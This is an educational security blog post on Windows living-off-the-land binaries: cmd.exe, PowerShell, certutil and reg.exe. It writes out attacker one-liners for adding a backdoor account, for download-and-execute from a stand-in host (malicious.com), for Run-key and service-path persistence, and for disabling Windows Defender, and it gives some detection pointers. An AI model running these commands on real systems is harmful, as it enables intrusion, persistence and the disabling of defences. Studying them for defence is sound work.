---
layout: post
title: "Exploring Living Off The Land Binaries and Techniques"
date: 2024-03-26
description: "A blog post digging into and exploring living off the land (LOTL) binaries and exploitation techniques."
category: write-ups
image: '/assets/images/10btGIciM2lFvwZTYlH5t6w.png'
tags: [write-ups, educational]
---

# Exploring A Few Living-Off-The-Land Binaries and Techniques

## Living off the Land (LOTL) Binaries - Windows

![Courtesy of DALL-E, prompt provided by Grant Wilsey (darkyolks)](/assets/images/10btGIciM2lFvwZTYlH5t6w.png)

When it comes to avoiding detection and maintaining access to a newly hacked system, attackers can become very resourceful. They will often employ techniques that leverage existing system tools on the system to remain hidden, maintain persistence, escalation privileges and exfiltrate data from the target. One such strategy is known as “Living off the Land” (LOTL), where attackers utilize legitimate binaries already present on the target system to execute malicious activities, making it harder for traditional security solutions to detect their actions. I’m interested in learning more about Living-off-the-land techniques, so in this blog post we’ll explore the concept of LOTL binaries and showcase a few simple examples that exploit native Windows capabilities.

### Understanding LOTL Binaries

LOTL binaries refer to legitimate executables found on operating systems that attackers repurpose for malicious activities. These binaries are part of the operating system’s standard toolkit and are trusted by security mechanisms, making them ideal for stealthy attacks. By leveraging LOTL binaries, attackers can evade detection and blend in with normal system operations, making it challenging for security analysts to identify their malicious activities.

#### A Few Examples of Living-Off-The-Land Binaries

#### 1. cmd.exe

`cmd.exe`is the standard command-line interpreter on Windows systems. Attackers can abuse this binary for various malicious purposes, such as executing commands, downloading files, or launching other processes. I gather several examples of how cmd.exe can be misused, or rather used with normal functionality except with malicious intent:

**Example 1: Command Execution**

```
cmd.exe /c net user hacker P@ssw0rd123 /add
```

In this example, an attacker that already likely has administrator privileges creates a new user account named “darkyolks” with the password “P@ssw0rd123” using the `net user` command executed via `cmd.exe`. This is a simple way yet effective way that adversaries use native features within Windows environments to maintain persistence.

![](/assets/images/13eGihN7zYK51S0HjGHWq1g.png)

Successful user creation via cmd.exe

![](/assets/images/1FRUnF4LCq2GAZnM8l55Uwg.png)

Denied user creation due to invalid privileges.

Proper logging set up for **Windows Event ID 4720** — “A User was created” is one way to detect this type of persistence.

**Example 2: Downloading Files**

```
cmd.exe /c powershell.exe -c “Invoke-WebRequest -Uri http://malicious.com/malicious.exe -OutFile C:\Temp\malicious.exe”
```

Here, the attacker uses `cmd.exe` to invoke **PowerShell** and download a malicious executable from a remote server. `powershell.exe` and `certutil.exe` are LOTL binaries themselves. Malicious.com/malicious.exe is quite suspicious.

#### 2. certutil.exe

`certutil.exe` is a command-line utility for managing digital certificates in Windows. While primarily used for legitimate purposes, attackers can abuse **certutil.exe** for file decoding/encoding and data exfiltration.

**Example 1: Data Exfiltration**

```
certutil.exe -urlcache -split -f http://malicious.com/secret.txt C:\Temp\secret.txt
```

In this example, the attacker uses `certutil.exe` to download a file (secret.txt) from a remote server and save it to the local system.

**Example 2: Encoding and Decoding Files with certutil.exe**

Another trick is using `certutil.exe` for encoding and decoding files, which can obfuscate malicious payloads to evade detection. Here's how you can encode a file:

```
certutil -encode payload.exe encoded_payload.txt
```

To decode the encoded file:

```
certutil -decode encoded_payload.txt decoded_payload.exe
```
#### 3. powershell.exe

`powershell.exe`is a powerful scripting environment built into Windows systems. Attackers commonly abuse PowerShell for various malicious activities, including command execution, file manipulation, and lateral movement. This binary will work similar to `cmd.exe`, as shown in previous examples when PowerShell was called via the command line.

**Example: Command Execution**

```
powershell.exe -ExecutionPolicy Bypass -Command “& {Invoke-Expression (New-Object Net.WebClient).DownloadString(‘http://malicious.com/script.ps1')}"
```

Similar to the `cmd.exe` example, an attacker uses `powershell.exe` to bypass execution policies then download and execute a malicious PowerShell script (script.ps1) from a remote server.

#### 4. reg.exe

`reg.exe` is a built-in Windows utility designed to manipulate the system registry. The system registry a hierarchical database that stores configuration settings and options on Microsoft Windows operating systems. Attackers may abuse `reg.exe` to modify registry keys related to system configurations, user settings, or installed software. By altering these keys, they can achieve persistence, escalate privileges, or even disable security mechanisms.

**Example 1: Achieving Persistence**  
`reg.exe` provides attackers with a convenient way to establish persistence by adding entries to the Windows registry that execute their malicious payloads during system startup.  
Example:

```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MaliciousProgram /t REG_SZ /d “C:\Malware\malware.exe” /f
```

In this example, the attacker uses `reg.exe` to add a registry entry under the current user’s `Run` key. This entry specifies the path to the malicious executable (malware.exe), ensuring that it runs every time the user logs in.

**Example 2: Escalating Privileges**

Privilege escalation is another common goal for attackers, as it grants them higher levels of access to the system and potentially allows them to execute more impactful attacks. The binary `reg.exe` can be exploited to escalate privileges by manipulating registry keys associated with system services or user accounts.

```
  
reg add “HKLM\SYSTEM\CurrentControlSet\Services\SomeVulnerableService” /v ImagePath /t REG_EXPAND_SZ /d “C:\Malware\malware.exe” /f
```

In this scenario, the attacker modifies the ‘*ImagePath’* value of a vulnerable system service using `reg.exe`. By replacing the legitimate service executable with their malicious payload (malware.exe), they can execute arbitrary code with elevated privileges the next time the service starts.

**Example 3: Disabling Security Software**

Attackers often seek to disable or bypass security software installed on the compromised system to evade detection and maintain their foothold. The binary `reg.exe` provides attackers with the ability to modify registry keys related to security software settings or configurations.

```
reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender” /v DisableAntiSpyware /t REG_DWORD /d 1 /f  
  

```

This command adds a registry key `DisableAntiSpyware` under `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender` and sets its value to `1`, which effectively disables Windows Defender permanently.

![](/assets/images/14Gcm4MXLkloUHAptSBmtWA.png)

Disabling Windows Defender with reg.exe via command line.

This screenshot shows the command executing successfully. Note the user running the command needs to be running with administrator privileges in order to make changes to the registry. An attacker may have already escalated their privileges to modify the registry at this stage of their attack.

### Conclusion

Living off the land binaries pose a significant challenge for defenders due to their legitimate nature and widespread use. By understanding the differences of legitimate binaries and malicious ones, analysts are tasked with triaging the events and piecing together the actions taken post-compromise. This essential skills protects

By adopting a proactive approach to security and leveraging threat intelligence, organizations can stay one step ahead of cyber adversaries and mitigate the risks associated with living off the land attacks.

For further research and exploration of LOTL binaries, the [LOLBAS project](https://lolbas-project.github.io/) provides a comprehensive repository of common LOTL binaries and their respective use cases in offensive security scenarios.



By [darkyolks](https://www.darkyolks.com) originally published on March 26, 2024.

